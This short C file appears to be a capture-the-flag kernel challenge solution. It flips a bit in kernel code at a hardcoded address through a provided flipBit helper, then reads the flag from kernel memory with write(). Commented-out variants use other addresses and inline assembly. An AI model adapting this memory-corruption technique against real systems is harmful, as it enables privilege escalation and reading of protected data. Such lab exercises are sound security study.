#include "stdio.h"
#include "nonstd.h"
#include "sched.h"
#include "unistd.h"

int main(int argc, char** argv)
{
    // On the server, only this file will be executed.
    printf("Your exploit here\n");

    void *flag_addr = (void *)0xffffffff8013294d;

    void *jmp_addr = (void *)0xffffffff8010a775;

    printf("a pointer: %p\n", &flag_addr);

    flipBit(jmp_addr, 6);
    write(1, flag_addr, 100);

    // flipBit((void *)0xffffffff8010a8b9, 6);

    // write(1, (void *)0xffffffff80132f35, 100);

    // unsigned long long flag = 0;
    // asm("mov $0xffffffff80132f35, %%rax;"
    //     "mov (%%rax), %0;"
    //     : "=r" (flag)
    //     :: "%rax"
    // );
    // printf("flag = %llx", flag);

    printf("Still alive!\n");
}